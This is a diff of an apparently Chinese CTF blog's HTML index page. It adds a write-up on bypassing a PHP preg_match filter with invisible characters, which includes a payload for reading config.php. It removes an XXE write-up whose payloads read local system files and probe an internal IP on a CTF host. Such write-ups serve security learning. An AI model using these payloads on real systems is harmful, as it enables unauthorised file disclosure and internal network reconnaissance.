@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 10px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 10px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 10px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -168,6 +168,90 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-不可见字符绕过" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/20/%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/" class="article-date">
+  	<time datetime="2021-09-19T16:00:00.000Z" itemprop="datePublished">2021-09-20</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/20/%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/">
+        不可见字符绕过
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="不可见字符绕过"><a href="#不可见字符绕过" class="headerlink" title="不可见字符绕过"></a>不可见字符绕过</h1><p>打开页面后，点击source，发现源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>我们看见这个提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br></pre></td></tr></table></figure>
+<p>可知，flag在config.php文件中，然后我们看见这一串加密代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现只要我们可以绕过这个if</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (hash_equals($secret, $guess))</span><br></pre></td></tr></table></figure>
+<p>就可以读取flag，但是由于random_bytes(64)是生成加密使用的64长度的加密随机字节字符串，而hash_equals()是匹配两个字符串是否相同，所以发现这个点不可以，但是我们仔细观看preg_match()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])</span><br></pre></td></tr></table></figure>
+<p>$_SERVER[‘PHP_SELF’]<br>作用是表示php文件相对于网站根目录的位置地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">实例：http://url/php/index.php                 /php/index.php</span><br><span class="line"></span><br><span class="line">           http://url/php/index.php?test=foo                   /php/index.php</span><br><span class="line"></span><br><span class="line">           http://url/php/index.php/test/foo                    /php/index.php/test/foo</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>而源码中的正则过滤是如果目录路径是以config.php/结尾的话，则会触发过滤，然后我们再看这串代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br></pre></td></tr></table></figure>
+
+<p>basename()<br>作用是返回路径中文件名部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$str1=&quot;/index.php/config.php/&quot;;</span><br><span class="line"></span><br><span class="line">echo basename($str1).&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">$str2=&quot;/index.php/config.php&quot;;</span><br><span class="line"></span><br><span class="line">echo  basename($str2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>所以我们可以使用highlight_file()这个函数和basename()这个函数来读取config.php文件，又因为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;source&#x27;]))</span><br></pre></td></tr></table></figure>
+<p>要经过上面的if才可以执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br></pre></td></tr></table></figure>
+<p>而source参数在index.php文件中，所以在我们构造payload时需要在config.php前加index.php，因为浏览器此时只会解析index.php文件，然后我们需要构造不可见字符在config.php/后面作为结尾，从而绕过正则过滤，而这些不可见字符在baseneme()函数中会被去除掉，所以写了个脚本来获取特殊字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function check($str)&#123;</span><br><span class="line">	return preg_match(&#x27;/config\.php\/*$/i&#x27;,$str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;255;$i++)&#123;</span><br><span class="line">	$s=&#x27;/index.php/config.php/&#x27;.chr($i);</span><br><span class="line">	if(!check($s))&#123;</span><br><span class="line">		$t=basename(&#x27;/index.php/config.php/&#x27;.chr($i));</span><br><span class="line">		echo &quot;$&#123;i&#125;:$&#123;t&#125;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>将不可见字符的ascii码化为16进制，并在前面加%即可使用，所以我们可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php/%80?source</span><br></pre></td></tr></table></figure>
+<p>就可以读取config.php文件</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-python反序列化以及反弹shell" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -1106,84 +1190,6 @@ $phar->setStub("<?php __HALT_COMPILER(); ?><p>“); //设置stub</p>
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-外部实体注入(xxe漏洞)之内网探测" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/10/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5(xxe%E6%BC%8F%E6%B4%9E)%E4%B9%8B%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B/" class="article-date">
-  	<time datetime="2021-09-09T16:00:00.000Z" itemprop="datePublished">2021-09-10</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/10/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5(xxe%E6%BC%8F%E6%B4%9E)%E4%B9%8B%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B/">
-        外部实体注入(xxe漏洞)之内网探测
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="外部实体注入-xxe漏洞-之内网探测"><a href="#外部实体注入-xxe漏洞-之内网探测" class="headerlink" title="外部实体注入(xxe漏洞)之内网探测"></a>外部实体注入(xxe漏洞)之内网探测</h1><p>我们打开页面后，发现是一个登录界面，所以我们可以填入username和password的信息，然后抓包，发现一串字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-<p>所以我们可以判断是外部实体注入(xxe漏洞)，此时我们可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY admin SYSTEM &quot;file:///文件路径&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-<p>来读取文件读取文件的内容，其中的admin可以自定义，而当我们构造的是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///flag</span><br></pre></td></tr></table></figure>
-<p>的时候，发现没有出现flag，所以我们需要向其他的文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/hosts #读取hosts文件</span><br><span class="line"></span><br><span class="line">file:///proc/net/arp #读取arp的信息</span><br></pre></td></tr></table></figure>
-<p>通过读取arp信息，我们可以看见一个ip</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.0.1.11</span><br></pre></td></tr></table></figure>
-<p>所以我们可以使用读取一下ip的信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.11/</span><br></pre></td></tr></table></figure>
-<p>发现报错</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOMDocument::loadXML(http://10.0.1.11/): failed to open stream: No route to host in</span><br></pre></td></tr></table></figure>
-<p>根据报错信息，我们试一下用bp扫描一下ip的C段</p>
-<p>最后发现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.6</span><br></pre></td></tr></table></figure>
-<p>可以读取，所以最后上传</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /doLogin.php HTTP/1.1</span><br><span class="line">Host: 1de4c2c9-7b64-4fd9-9fe8-f95a61db93dc.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0</span><br><span class="line">Accept: application/xml, text/xml, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/xml;charset=utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 168</span><br><span class="line">Origin: http://1de4c2c9-7b64-4fd9-9fe8-f95a61db93dc.node4.buuoj.cn:81</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://1de4c2c9-7b64-4fd9-9fe8-f95a61db93dc.node4.buuoj.cn:81/</span><br><span class="line">Cookie: UM_distinctid=17ae21e0e7f4c7-0fd161bcfd1ad38-4c3e257a-186a00-17ae21e0e80551</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY admin SYSTEM &quot;http://10.0.1.6/&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li></ul>
 	</div>
 
       
